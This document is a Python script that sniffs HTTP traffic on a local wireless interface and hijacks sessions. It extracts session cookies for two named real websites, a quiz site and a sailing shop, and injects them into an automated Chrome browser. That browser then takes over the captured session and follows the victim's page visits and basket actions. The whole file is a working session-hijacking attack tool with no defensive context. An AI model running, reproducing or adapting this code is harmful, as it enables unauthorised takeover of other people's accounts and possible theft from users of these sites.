from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from typing import List
import pyshark
import re
import signal


# website : cookie name
searched_webpages = {
    "www.testyou.in": "ASP.NET_SessionId",
    "sklepyzeglarskie.pl": "soteshop"
}
accepted_cookies = {}
prompt = '''
-------------------
Found session with from: %s,
With cookie: (%s, %s).
Do you want to take control over the session? [Y/N]
'''


def parse_cookies(cookies: str) -> List[dict]:
    return [
        {"name": cookie[0], "value": cookie[1]}
        for cookie in [cookie.split("=") for cookie in cookies.split("; ")]
    ]


class SessionCookieNotFoundError(Exception):
    """Raised when http cookies do not contain session cookie."""


def get_session_cookie(packet: str) -> dict:
    cookies = packet.http.cookie
    try:
        return next(
            cookie
            for cookie in parse_cookies(cookies)
            if cookie["name"] == searched_webpages[packet.http.host]
        )
    except StopIteration:
        raise SessionCookieNotFoundError()


def hijack_session(interface, options):
    capture = pyshark.LiveCapture(
        interface=interface, display_filter="http.cookie || http.cookie_pair"
    )

    print("Listening for cookies")
    print('Press Ctrl+C to stop \n')

    product_regex = r"http:\/\/[A-Za-z.]*\/[A-Za-z0-9.-]*\.html"
    category_regex = r"\/category\/"
    basket_regex = r"\/basket\/"

    for packet in capture.sniff_continuously():
        if packet.http.host in searched_webpages:
            try:
                # Get url from packet
                base_url = packet.http.request_full_uri
                session_cookie = get_session_cookie(packet)

                # If session cookie is already accepted
                if session_cookie["value"] in accepted_cookies:
                    # It is a product or category, then rediect
                    if re.match(product_regex, base_url) or \
                            re.match(category_regex, packet.http.request_uri):
                        browser = accepted_cookies[session_cookie["value"]]

                        if str(browser.current_url) != str(base_url):
                            browser.execute_script(
                                "window.location.href = '%s'" % base_url
                            )
                    if re.match(basket_regex, packet.http.request_uri):
                        browser.refresh()
                    continue

                print(prompt % (
                    packet.http.host,
                    session_cookie["name"],
                    session_cookie["value"]
                    ), end=""
                )
                yes_or_no = input()
                if yes_or_no == "y":
                    browser = webdriver.Chrome(
                        options=options,
                        executable_path="/usr/bin/chromedriver"
                    )
                    browser.get(base_url)
                    browser.add_cookie(session_cookie)
                    browser.refresh()

                    accepted_cookies[session_cookie["value"]] = browser
                elif yes_or_no == "e":
                    return
            except (AttributeError, SessionCookieNotFoundError):
                continue


def signal_handler(sig, frame):
    print("\nEND")


if __name__ == "__main__":
    options = Options()
    options.binary_location = "/usr/bin/google-chrome"
    options.add_argument("--no-sandbox")
    options.add_argument("--disable-dev-shm-usage")

    # Initialise Ctrl + C action
    signal.signal(signal.SIGINT, signal_handler)

    hijack_session("wlp8s0", options)
